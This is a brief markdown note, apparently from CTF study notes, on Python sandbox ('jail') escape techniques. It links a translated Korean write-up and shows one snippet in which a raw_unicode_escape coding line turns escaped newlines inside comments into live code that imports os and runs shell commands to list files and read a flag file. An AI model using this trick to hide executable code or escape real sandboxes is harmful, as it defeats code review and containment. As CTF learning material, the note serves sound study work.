# Jailbreak techniques
https://translate.google.com/translate?sl=ko&tl=en&u=https://defenit.kr/2019/09/27/Pwn/%25E3%2584%25B4%2520Research/python_jail/

# Python
## Write/Execute code in comments
```python
# coding: raw_unicode_escape
#\u000aimport os
#\u000aos.system("ls -laF")
#\u000aos.system("cat *flag*")
```